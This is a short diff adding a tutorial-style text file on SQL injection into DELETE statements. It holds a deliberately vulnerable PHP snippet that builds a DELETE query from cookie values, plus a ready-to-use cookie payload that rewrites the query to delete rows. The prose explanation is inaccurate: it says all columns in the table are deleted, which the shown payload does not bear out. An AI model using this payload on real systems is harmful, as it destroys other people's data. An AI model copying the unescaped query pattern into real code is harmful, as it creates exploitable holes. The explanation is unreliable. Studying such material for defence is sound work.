@@ -1,0 +1,19 @@
+DELETE Statement Injection:
+---------------------------
+When injecting into a DELETE Statement unless the script your attacking is connected to a MS SQL Database (so you can batch queries) the only thing you will be able to do is delete row(s) in a table. In the example shown, the username value in the SQL Query will be escaped and then the entire query manipulated to be true, so all database columns in the table are deleted.
+
+Example: 
+--------
+$authcred = split(":", $_COOKIE['usercred']);
+$username = $authcred[0];
+$userauth = $authcred[1];
+
+$deletesql = "DELETE FROM users WHERE USER_NAME = '" . $username . "'" . " AND PASSWORD = '" . $userauth . "'";
+HTTP Cookie Contents:
+----------------------
+Value Name 		Value Data
+----------		----------
+Name 			usercred
+Content 		fuck' OR USER_ID = 1 #:99754106633f94d350db34d548d6091a
+Host 			10.0.0.4
+Path 			/
